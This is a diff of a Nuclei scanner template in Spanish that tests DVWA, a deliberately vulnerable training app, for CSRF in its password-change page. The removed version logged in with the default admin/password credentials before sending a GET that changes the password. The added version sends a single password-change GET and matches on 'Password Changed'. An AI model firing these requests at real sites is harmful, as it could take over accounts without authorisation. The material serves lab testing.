@@ -1,60 +1,23 @@
 id: CSRF_VALIDADO
-
 info:
-  name: CSRF - Cambio de contraseña sin token
-  severity: high
+  name: CSRF para DVWA
   author: Fabian Morales
-  description: |
-    Detecta vulnerabilidades CSRF en funcionalidades de cambio de contraseña
-    que no implementan tokens anti-CSRF.
-  reference:
-    - https://owasp.org/www-community/attacks/csrf
-  tags: csrf,web,security,auth
+  severity: LOW
+  description: CSRF Basico para los que contienen token.
 
 variables:
-  new_password: "contraseña"
+  new_password: "NuevaContraseña123."
 
-http:
-  - raw:
-      - |
-        GET /login HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0
-
-      - |
-        POST /login HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        User-Agent: Mozilla/5.0
-
-        username=admin&password=password&Login=Login
-
-      - |
-        GET /csrf/ HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0
-
-      - |
-        GET /csrf/?password_new=password&password_conf=password&Change=Change HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0
-
-    cookie-reuse: true
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?password_new={{new_password}}&password_conf={{new_password}}&Change=Change"
     matchers:
-      - type: word
-        words:
-          - "Password Changed"
-          - "contraseña cambiada"
-          - "password changed"
-          - "successfully changed"
-        part: body
-        condition: or
-
-    extractors:
       - type: regex
-        name: csrf_token
         part: body
         regex:
-          - 'name="user_token" value="([a-f0-9]{32})"'
-          - 'csrf_token" value="([^"]+)"'
-        group: 1
+          - "Password Changed"
+        condition: or
+      - type: status
+        status:
+          - 200
